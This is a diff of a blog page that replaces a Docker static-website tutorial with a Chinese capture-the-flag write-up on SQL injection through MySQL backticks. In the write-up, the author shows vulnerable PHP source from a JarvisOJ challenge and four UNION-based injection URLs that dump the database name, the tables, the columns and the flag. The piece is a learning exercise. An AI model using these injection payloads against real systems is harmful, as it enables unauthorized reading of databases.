@@ -96,20 +96,18 @@
 
 
 
-  <meta name="description" content="一、环境准备1、安装docker参照https://j-kangel.github.io/2019/03/24/hyperledger/里面docker安装部分 二、搭建静态网站1、创建docker镜像12docker run -p 80 --name web -i -t ubuntu /bin/bash  //启动交互式容器root@6f9c831d1d1b:/#        //进入dock">
-<meta name="keywords" content="docker">
+  <meta name="description" content="反引号在mysql中的作用反引号在键盘的左上角，在mysql中可以区别关键字 123456#假如表A中有一列名为select，查询该列select select from A;   #错误select `select` from A;  #正确#假如存在表flag，用desc(describe)查询该表信息desc flag A;  #显示flag表信息，别名为Adesc `flag` `A` #">
+<meta name="keywords" content="web,sql注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="使用docker部署静态网站">
-<meta property="og:url" content="https://j-kangel.github.io/2019/03/25/docker/index.html">
+<meta property="og:title" content="sql注入之反引号">
+<meta property="og:url" content="https://j-kangel.github.io/2019/04/07/sql注入之反引号/index.html">
 <meta property="og:site_name" content="KANGEL">
-<meta property="og:description" content="一、环境准备1、安装docker参照https://j-kangel.github.io/2019/03/24/hyperledger/里面docker安装部分 二、搭建静态网站1、创建docker镜像12docker run -p 80 --name web -i -t ubuntu /bin/bash  //启动交互式容器root@6f9c831d1d1b:/#        //进入dock">
+<meta property="og:description" content="反引号在mysql中的作用反引号在键盘的左上角，在mysql中可以区别关键字 123456#假如表A中有一列名为select，查询该列select select from A;   #错误select `select` from A;  #正确#假如存在表flag，用desc(describe)查询该表信息desc flag A;  #显示flag表信息，别名为Adesc `flag` `A` #">
 <meta property="og:locale" content="Chinese">
-<meta property="og:image" content="https://j-kangel.github.io/2019/03/25/docker/0.JPG">
-<meta property="og:updated_time" content="2019-04-04T06:53:13.702Z">
+<meta property="og:updated_time" content="2019-04-09T14:14:56.161Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="使用docker部署静态网站">
-<meta name="twitter:description" content="一、环境准备1、安装docker参照https://j-kangel.github.io/2019/03/24/hyperledger/里面docker安装部分 二、搭建静态网站1、创建docker镜像12docker run -p 80 --name web -i -t ubuntu /bin/bash  //启动交互式容器root@6f9c831d1d1b:/#        //进入dock">
-<meta name="twitter:image" content="https://j-kangel.github.io/2019/03/25/docker/0.JPG">
+<meta name="twitter:title" content="sql注入之反引号">
+<meta name="twitter:description" content="反引号在mysql中的作用反引号在键盘的左上角，在mysql中可以区别关键字 123456#假如表A中有一列名为select，查询该列select select from A;   #错误select `select` from A;  #正确#假如存在表flag，用desc(describe)查询该表信息desc flag A;  #显示flag表信息，别名为Adesc `flag` `A` #">
 
 
 
@@ -119,7 +117,7 @@
 
   
   
-  <link rel="canonical" href="https://j-kangel.github.io/2019/03/25/docker/"/>
+  <link rel="canonical" href="https://j-kangel.github.io/2019/04/07/sql注入之反引号/"/>
 
 
 
@@ -129,7 +127,7 @@
   };
 </script>
 
-  <title>使用docker部署静态网站 | KANGEL</title>
+  <title>sql注入之反引号 | KANGEL</title>
   
 
 
@@ -328,7 +326,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://j-kangel.github.io/2019/03/25/docker/"/>
+    <link itemprop="mainEntityOfPage" href="https://j-kangel.github.io/2019/04/07/sql注入之反引号/"/>
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="kangel"/>
@@ -345,7 +343,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">使用docker部署静态网站
+          <h1 class="post-title" itemprop="name headline">sql注入之反引号
 
               
             
@@ -371,7 +369,7 @@
                 
               
 
-              <time title="Created: 2019-03-24 20:11:21" itemprop="dateCreated datePublished" datetime="2019-03-24T20:11:21Z">2019-03-24</time>
+              <time title="Created: 2019-04-06 21:58:19" itemprop="dateCreated datePublished" datetime="2019-04-06T21:58:19Z">2019-04-06</time>
             
 
             
@@ -388,7 +386,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-04-04 06:53:13" itemprop="dateModified" datetime="2019-04-04T06:53:13Z">2019-04-04</time>
+                <time title="Modified: 2019-04-09 14:14:56" itemprop="dateModified" datetime="2019-04-09T14:14:56Z">2019-04-09</time>
               
             
           </span>
@@ -405,7 +403,14 @@
                 <span class="post-meta-item-text">In</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/区块链学习/" itemprop="url" rel="index"><span itemprop="name">区块链学习</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web/jarvisOJga/" itemprop="url" rel="index"><span itemprop="name">jarvisOJga</span></a></span>
 
                 
                 
@@ -440,22 +445,23 @@
       
 
       
-        <h3 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h3><h4 id="1、安装docker"><a href="#1、安装docker" class="headerlink" title="1、安装docker"></a>1、安装docker</h4><p>参照<a href="https://j-kangel.github.io/2019/03/24/hyperledger/里面docker安装部分">https://j-kangel.github.io/2019/03/24/hyperledger/里面docker安装部分</a></p>
-<h3 id="二、搭建静态网站"><a href="#二、搭建静态网站" class="headerlink" title="二、搭建静态网站"></a>二、搭建静态网站</h3><h4 id="1、创建docker镜像"><a href="#1、创建docker镜像" class="headerlink" title="1、创建docker镜像"></a>1、创建docker镜像</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 80 --name web -i -t ubuntu /bin/bash  //启动交互式容器</span><br><span class="line">root@6f9c831d1d1b:/<span class="comment">#        //进入docker交互式容器</span></span><br></pre></td></tr></table></figure>
-<h4 id="2、在docker中安装nginx和vim"><a href="#2、在docker中安装nginx和vim" class="headerlink" title="2、在docker中安装nginx和vim"></a>2、在docker中安装nginx和vim</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@6f9c831d1d1b:/<span class="comment"># apt-get update</span></span><br><span class="line">root@6f9c831d1d1b:/<span class="comment"># apt-get install -y nginx</span></span><br><span class="line">root@6f9c831d1d1b:/<span class="comment"># apt-get install -y vim</span></span><br></pre></td></tr></table></figure>
-<h4 id="3、创建网页目录"><a href="#3、创建网页目录" class="headerlink" title="3、创建网页目录"></a>3、创建网页目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@6f9c831d1d1b:/<span class="comment"># mkdir -p /var/www/html</span></span><br></pre></td></tr></table></figure>
-<h4 id="4、添加网页"><a href="#4、添加网页" class="headerlink" title="4、添加网页"></a>4、添加网页</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@6f9c831d1d1b:/<span class="comment"># cd /var/www/html</span></span><br><span class="line">root@6f9c831d1d1b:/var/www/html<span class="comment"># vim index.html</span></span><br></pre></td></tr></table></figure>
-<p>在index.html中输入：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>nginx in docker<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            Hello,World!</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>保存后退出，查看端口</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port web</span><br></pre></td></tr></table></figure>
-<p>显示如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80/tcp -&gt; 0.0.0.0:32770</span><br></pre></td></tr></table></figure>
-<h4 id="5、查看网页"><a href="#5、查看网页" class="headerlink" title="5、查看网页"></a>5、查看网页</h4><p>使用curl查看：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:32770     <span class="comment">#32770为容器端口</span></span><br></pre></td></tr></table></figure>
-<p>使用浏览器查看,如下图所示：</p>
-<p><img src="/2019/03/25/docker/0.JPG" alt=""></p>
-<h3 id="三、docker其他命令"><a href="#三、docker其他命令" class="headerlink" title="三、docker其他命令"></a>三、docker其他命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker attach web  <span class="comment">##重新进入容器</span></span><br><span class="line">docker ps          <span class="comment">##查看docker进程</span></span><br><span class="line">docker top web     <span class="comment">##查看docker容器的进程</span></span><br><span class="line">docker inspect | grep -i IPaddress   <span class="comment">##查看docker的ip地址</span></span><br><span class="line">docker inspect | grep -i hostport    <span class="comment">##查看容器端口</span></span><br></pre></td></tr></table></figure>
+        <h3 id="反引号在mysql中的作用"><a href="#反引号在mysql中的作用" class="headerlink" title="反引号在mysql中的作用"></a>反引号在mysql中的作用</h3><p>反引号在键盘的左上角，在mysql中可以区别关键字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#假如表A中有一列名为select，查询该列</span><br><span class="line">select select from A;   #错误</span><br><span class="line">select `select` from A;  #正确</span><br><span class="line">#假如存在表flag，用desc(describe)查询该表信息</span><br><span class="line">desc flag A;  #显示flag表信息，别名为A</span><br><span class="line">desc `flag` `A` #与上述语句相同</span><br></pre></td></tr></table></figure>
+<h3 id="一道与之相关的web题"><a href="#一道与之相关的web题" class="headerlink" title="一道与之相关的web题"></a>一道与之相关的web题</h3><p>题目链接：<a href="http://web.jarvisoj.com:32794/" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/</a></p>
+<p>Hint1: 先找到源码再说吧~~</p>
+<p>后台扫描，得到源码：<a href="http://web.jarvisoj.com:32794/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php</a>~</p>
+<p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当<code>table</code>为空时，输出<code>flag{xxx}</code>，说明存在表<code>secret_test</code>。我们直接构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php?table=test` `union select database() limit 1,1</span><br></pre></td></tr></table></figure>
+<p>得到数据库61d00，接着爆表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php?table=test` `union select group_concat(table_name) from information_schema.tables where table_schema = database() limit 1,1</span><br></pre></td></tr></table></figure>
+<p>得到secret_flag,secret_test，接着爆字段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php?table=test` `union select group_concat(column_name) from information_schema.columns where table_name = 0x7365637265745f666c6167 limit 1,1</span><br></pre></td></tr></table></figure>
+<p>得到flagUwillNeverKnow，最后爆出flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php?table=test` `union select flagUwillNeverKnow  from secret_flag limit 1,1</span><br></pre></td></tr></table></figure>
+<p>flag{luckyGame~}</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>该题只要清楚mysql中反引号的作用以及desc的使用，就变成了最基本的sql注入，没有过滤任何字符的注入。</p>
 
       
     </div>
@@ -489,7 +495,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/docker/" rel="tag"><i class="fa fa-tag"></i>docker</a>
+            <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i>web</a>
+          
+            <a href="/tags/sql注入/" rel="tag"><i class="fa fa-tag"></i>sql注入</a>
           
         </div>
       
@@ -502,8 +510,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/24/hyperledger/" rel="next" title="Ubuntu 16.04 搭建hyperledger fabric 1.4">
-                <i class="fa fa-chevron-left"></i> Ubuntu 16.04 搭建hyperledger fabric 1.4
+              <a href="/2019/04/05/hash-attack/" rel="next" title="hash长度扩展攻击">
+                <i class="fa fa-chevron-left"></i> hash长度扩展攻击
               </a>
             
           </div>
@@ -512,8 +520,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/03/28/trade-finance/" rel="prev" title="trade-finance-logistics网络运行与分析">
-                trade-finance-logistics网络运行与分析 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/04/09/RC4/" rel="prev" title="逆向踩坑之RC4">
+                逆向踩坑之RC4 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -710,7 +718,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、环境准备"><span class="nav-number">1.</span> <span class="nav-text">一、环境准备</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、安装docker"><span class="nav-number">1.1.</span> <span class="nav-text">1、安装docker</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、搭建静态网站"><span class="nav-number">2.</span> <span class="nav-text">二、搭建静态网站</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、创建docker镜像"><span class="nav-number">2.1.</span> <span class="nav-text">1、创建docker镜像</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、在docker中安装nginx和vim"><span class="nav-number">2.2.</span> <span class="nav-text">2、在docker中安装nginx和vim</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、创建网页目录"><span class="nav-number">2.3.</span> <span class="nav-text">3、创建网页目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4、添加网页"><span class="nav-number">2.4.</span> <span class="nav-text">4、添加网页</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5、查看网页"><span class="nav-number">2.5.</span> <span class="nav-text">5、查看网页</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、docker其他命令"><span class="nav-number">3.</span> <span class="nav-text">三、docker其他命令</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#反引号在mysql中的作用"><span class="nav-number">1.</span> <span class="nav-text">反引号在mysql中的作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#一道与之相关的web题"><span class="nav-number">2.</span> <span class="nav-text">一道与之相关的web题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
             
 
           </div>
